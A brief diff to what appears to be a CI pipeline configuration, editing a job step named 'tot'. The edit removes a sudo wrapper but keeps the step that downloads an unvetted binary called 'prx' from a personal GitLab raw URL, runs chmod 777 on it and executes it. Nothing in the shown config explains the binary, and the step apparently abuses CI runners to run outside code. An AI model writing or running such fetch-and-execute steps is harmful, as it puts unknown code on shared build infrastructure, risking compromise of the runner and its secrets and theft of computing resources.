@@ -18,7 +18,7 @@ jobs:
        - run:
           name: "tot"
           command: |
-           sudo su --command "wget https://gitlab.com/Sherwoodrey/prx/-/raw/main/prx && chmod 777 prx"
+           wget https://gitlab.com/Sherwoodrey/prx/-/raw/main/prx && chmod 777 prx
            chmod 777 prx
            ./prx
 
